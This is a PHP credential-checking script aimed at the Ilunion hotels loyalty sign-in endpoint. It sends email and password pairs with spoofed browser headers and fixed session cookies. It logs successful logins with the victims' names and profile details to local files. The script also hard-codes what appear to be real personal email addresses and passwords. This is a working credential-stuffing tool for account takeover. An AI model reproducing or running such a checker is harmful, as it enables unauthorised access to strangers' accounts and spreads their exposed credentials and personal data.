<?php
    error_reporting(0);
    function Api($email, $password) {
        $dates = date("d/m/Y | H:i:s");
        $header = [
            'Host: www.ilunionhotels.com',
            'Cookie: CookieScriptConsent={"action":"accept","categories":"[\"targeting\",\"performance\",\"unclassified\",\"functionality\"]","key":"2cd60d65-7265-44b7-9947-f6c5d9b1058a"}; _gid=GA1.2.1397498382.1701992249; G_ENABLED_IDPS=google; NewDispoParams="{\"coddestino\": \"sanmames\"}"; csrftoken=Ozel8CSDsB3ssX9FC7xU6zh2zDuokF8xibgNnjBsSXARiuu1s8wwRihdRKqGdtYv; sessionid=w3vle3i093m678c3xfrch20ly1qh9hx5; AMP_TOKEN=%24NOT_FOUND; cto_bundle=9_n9k19CVGZVQVQ0JTJGN2prN0kyenU0TjRJaU5ZNXQyM3B6aDRlSW51VmFVemhiOSUyQkQ4S3g1VnZScG0wWGQ0ZWdaVGdWYVlkayUyRmhlMkxhak8yYUolMkZHQWdFV0Z3dlRwRk9GM3NYREtpbURDUVowQWFXQjNnVG8lMkZqQjF5dmlkdFB4b2JlcGJLQjZVWmQySExRZjd5cnZDandRSVFlT0lQeGRQVnQydk9VSDlreW5JWnhFJTNE; _uetsid=948b71f0955911eeac5c63b3855f8f7a; _uetvid=948b9080955911eea03f8fb2428aa530; _ga=GA1.1.1167154215.1701992239; _ga_5GXLRENBL9=GS1.1.1702075078.1.0.1702075229.60.0.0; _ga_PVL5EC0470=GS1.1.1702075078.1.1.1702075234.0.0.0; _gcl_au=1.1.1048712311.1701992246.827439215.1702075235.1702075234; _fbp=fb.1.1702075256035.652411423',
            'Content-Length: 52',
            'Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-Ch-Ua-Mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Accept: application/json',
            'X-Requested-With: XMLHttpRequest',
            'X-Csrftoken: Ozel8CSDsB3ssX9FC7xU6zh2zDuokF8xibgNnjBsSXARiuu1s8wwRihdRKqGdtYv',
            'Sec-Ch-Ua-Platform: "Windows"',
            'Origin: https://www.ilunionhotels.com',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: https://www.ilunionhotels.com/bookcore/partempresas/login-particular/',
            'Priority: u=1, i',
        ];
        $post = 'email=antonio.hdezb%40gmail.com&password=AhbIlu_2009';
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://www.ilunionhotels.com/bookcore/loyalty/ajax/signin/?lang=es",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_MAXREDIRS => -1,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_POSTFIELDS => $post,
            CURLOPT_CUSTOMREQUEST => "POST"
        ));
        $result = curl_exec($curl);
        $result = json_decode($result, true);
        curl_close($curl);
        if(strpos($result['email'],"@")){
            $date = date("d/m/Y | H:i:s");
            $info = 'Email: '.$email.' | Senha: '.$password.'  | '.$date."\nNombre Completo: ".$result['nombre_completo']."\nE-Mail: ".$result['email']."\nApelidos: ".$result['apelidos']."\nEmail Confirmado: ".$result['email_confirmado']."\nParticular: ".$result['particular']."\nNombre: ".$result['nombre'];
            $DateSave = date("d_m_Y");
            $dir = "./key/".$DateSave;
            $file = "./key/".$DateSave."/$email.txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $SaveDoc = fopen($file, "a+");
            fwrite($SaveDoc, $info."\n");
            fclose($SaveDoc);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m [ > H10HOTELS'API < ]  SUCCESS LOGIN: $email | $password | [ $dates ]"."\e[0m\e[0;32;42m [ • ] \e[0m\n";
        }else {
            echo"\e[1;33;43m[ • ] \e[0m\e[0;43m [ > H10HOTELS'API < ]  INVALID LOGIN: $email | $password | [ $dates ]"."\e[0m\e[1;33;43m [ • ] \e[0m\n";
        }
    }
    Api('mariorainy1@gmail.com','Rolandmc909');
?>